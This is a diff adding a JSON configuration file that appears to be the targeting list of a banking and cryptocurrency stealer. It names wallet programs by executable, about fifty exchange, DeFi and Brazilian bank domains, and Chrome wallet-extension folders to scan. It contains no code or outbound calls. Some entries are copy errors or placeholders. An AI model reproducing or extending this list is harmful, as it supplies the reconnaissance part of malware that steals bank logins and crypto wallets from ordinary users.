@@ -1,0 +1,369 @@
+{
+    "program_scan": [
+	{
+		"type":"3.0",
+		"name": "atomic-app",
+		"keyword": "atomic",
+		"exe": "Atomic Wallet.exe"
+	},
+	{
+		"type":"3.0",
+		"name": "exodus-app",
+		"keyword": "exodus",
+		"exe": "Exodus.exe"
+	},
+	{
+		"type":"3.0",
+		"name": "mymonero-app",
+		"keyword": "mymonero",
+		"exe": "MyMonero.exe"
+	},
+	{
+		"type":"3.0",
+		"name": "monero-app",
+		"keyword": "monero",
+		"exe": "monero-wallet-gui.exe"
+	},
+	{
+		"type":"3.0",
+		"name": "ledger",
+		"keyword": "ledger",
+		"exe": "ledger.exe"
+	},
+	{
+		"type":"3.0",
+		"name": "trezor",
+		"keyword": "trezor",
+		"exe": "trezor Suite.exe"
+	},
+	{
+		"type":"3.0",
+		"name": "itau-app",
+		"keyword": "aplicativo ita",
+		"exe": "trezor Suite.exe"
+	},
+	{
+		"type":"3.0",
+		"name": "warsaw",
+		"keyword": "warsaw-banks",
+		"exe": "core.exe"
+	}
+    ],
+    "site_scan": [
+        {
+            "name": "binance",
+			"title": "binance",
+            "domain": "binance.com"
+        },
+        {
+            "name": "coinbase",
+			"title": "coinbase",
+            "domain": "coinbase.com"
+        },
+        {
+            "name": "kraken",
+            "title": "kraken",
+            "domain": "kraken.com"
+        },
+        {
+            "name": "bitmex",
+            "title": "bitmex",
+            "domain": "bitmex.com"
+        },
+        {
+            "name": "kucoin",
+            "title": "kucoin",
+            "domain": "kucoin.com"
+        },
+        {
+            "name": "bitstamp",
+            "title": "bitstamp",
+            "domain": "bitstamp.net"
+        },
+        {
+            "name": "bitso",
+            "title": "bitso",
+            "domain": "bitso.com"
+        },
+        {
+            "name": "bitfinex",
+            "title": "bitfinex",
+            "domain": "bitfinex.com"
+        },
+        {
+            "name": "okx",
+            "title": "okx",
+            "domain": "okx.com"
+        },
+        {
+            "name": "bithumb",
+            "title": "bithumb",
+            "domain": "bithumb.com"
+        },
+        {
+            "name": "bybit",
+            "title": "bybit",
+            "domain": "bybit.com"
+        },
+        {
+            "name": "binance-us",
+            "title": "binance-us",
+            "domain": "binance.us"
+        },
+        {
+            "name": "gateio",
+            "title": "gateio",
+            "domain": "gate.io"
+        },
+        {
+            "name": "bitflyer",
+            "title": "bitflyer",
+            "domain": "bitflyer.com"
+        },
+        {
+            "name": "bitget",
+            "title": "bitget",
+            "domain": "bitget.com"
+        },
+        {
+            "name": "gemini",
+            "title": "gemini",
+            "domain": "gemini.com"
+        },
+        {
+            "name": "lbank",
+            "title": "lbank",
+            "domain": "lbank.info"
+        },
+        {
+            "name": "crypto-com",
+            "title": "crypto-com",
+            "domain": "crypto.com"
+        },
+        {
+            "name": "upbit",
+            "title": "upbit",
+            "domain": "upbit.com"
+        },
+        {
+            "name": "probit",
+            "title": "probit",
+            "domain": "probit.com"
+        },
+        {
+            "name": "coinsbit",
+            "title": "coinsbit",
+            "domain": "coinsbit.io"
+        },
+        {
+            "name": "bittrex",
+            "title": "bittrex",
+            "domain": "bittrex.com"
+        },
+        {
+            "name": "coinex",
+            "title": "coinex",
+            "domain": "coinex.com"
+        },
+        {
+            "name": "paxful",
+            "title": "paxful",
+            "domain": "paxful.com"
+        },
+        {
+            "name": "bitcointoyou",
+            "title": "bitcointoyou",
+            "domain": "bitcointoyou.com"
+        },
+        {
+            "name": "bitnuvem",
+            "title": "bitnuvem",
+            "domain": "bitnuvem.com"
+        },
+        {
+            "name": "bitpreco",
+            "title": "bitpreco",
+            "domain": "bitpreco.com"
+        },
+        {
+            "name": "uphold",
+            "title": "uphold",
+            "domain": "uphold.com"
+        },
+        {
+            "name": "metamask",
+            "title": "metamask",
+            "domain": "metamask.io"
+        },
+        {
+            "name": "myetherwallet",
+            "title": "myetherwallet",
+            "domain": "myetherwallet.com"
+        },
+        {
+            "name": "ledger",
+            "title": "ledger",
+            "domain": "ledger.com"
+        },
+        {
+            "name": "trezor",
+            "title": "trezor",
+            "domain": "trezor.io"
+        },
+        {
+            "name": "etoro",
+            "title": "etoro",
+            "domain": "etoro.com"
+        },
+        {
+            "name": "bit2me",
+            "title": "bit2me",
+            "domain": "bit2me.com"
+        },
+        {
+            "name": "bitvavo",
+            "title": "bitvavo",
+            "domain": "bitvavo.com"
+        },
+        {
+            "name": "bitpanda",
+            "title": "bitpanda",
+            "domain": "bitpanda.com"
+        },
+        {
+            "name": "robinhood",
+            "title": "robinhood",
+            "domain": "robinhood.com"
+        },
+        {
+            "name": "cex",
+            "title": "cex",
+            "domain": "cex.io"
+        },
+        {
+            "name": "uniswap",
+            "title": "uniswap",
+            "domain": "uniswap.org"
+        },
+        {
+            "name": "pancakeswap",
+            "title": "pancakeswap",
+            "domain": "pancakeswap.finance"
+        },
+        {
+            "name": "compound",
+            "title": "compound",
+            "domain": "compound.finance"
+        },
+        {
+            "name": "1inch",
+            "title": "1inch",
+            "domain": "1inch.io"
+        },
+        {
+            "name": "trustwallet",
+            "title": "trustwallet",
+            "domain": "trustwallet.com"
+        },
+        {
+            "name": "blockchain",
+            "title": "blockchain",
+            "domain": "blockchain.com"
+        },
+        {
+            "name": "br_brasilbitcoin",
+            "title": "br_brasilbitcoin",
+            "domain": "brasilbitcoin.com.br"
+        },
+        {
+            "name": "br_coinext",
+            "title": "br_coinext",
+            "domain": "coinext.com.br"
+        },
+        {
+            "name": "br_foxbit",
+            "title": "br_foxbit",
+            "domain": "foxbit.com.br"
+        },
+        {
+            "name": "br_mercadobitcoin",
+            "title": "br_mercadobitcoin",
+            "domain": "mercadobitcoin.com.br"
+        },
+        {
+            "name": "br_novadax",
+            "title": "br_novadax",
+            "domain": "novadax.com.br"
+        },
+        {
+            "name": "bitcointrade",
+            "title": "bitcointrade",
+            "domain": "bitcointrade.com.br"
+        },
+        {
+            "name": "bitcointrade",
+            "title": "bitcointrade",
+            "domain": "bitcointrade.com.br"
+        },
+        {
+            "name": "br_bb",
+            "title": "br_bb",
+            "domain": "bb.com.br"
+        },
+        {
+            "name": "br_santander",
+            "title": "br_santander",
+            "domain": "santander.com.br"
+        },
+        {
+            "name": "br_sicob",
+            "title": "br_sicob",
+            "domain": "sicob.com.br"
+        },
+        {
+            "name": "br_mercadopago",
+            "title": "br_mercadopago",
+            "domain": "mercadopago.com.br"
+        },
+        {
+            "name": "br_paypal",
+            "title": "br_paypal",
+            "domain": "paypal.com.br"
+        },
+        {
+            "name": "br_itau",
+            "title": "br_itau",
+            "domain": "itau.com.br"
+        }
+    ],
+    "extension_scan": [
+        {
+            "path": "%localappdata%/Google/Chrome/User Data/Default/Extensions/*",
+            "file": "manifest.json",
+            "extensions": [
+                {
+                    "name": "metamask",
+                    "key": "Adguard"
+                },
+                {
+                    "name": "binance",
+                    "key": "Binance Wallet"
+                }
+            ]
+        },
+        {
+            "path": "%localappdata%/any other folder/Extensions/*",
+            "file": "any_file.txt",
+            "extensions": [
+                {
+                    "name": "any name",
+                    "key": "abc123"
+                },
+                {
+                    "name": "any name",
+                    "key": "Binance Wallet"
+                }
+            ]
+        }
+    ]
+}
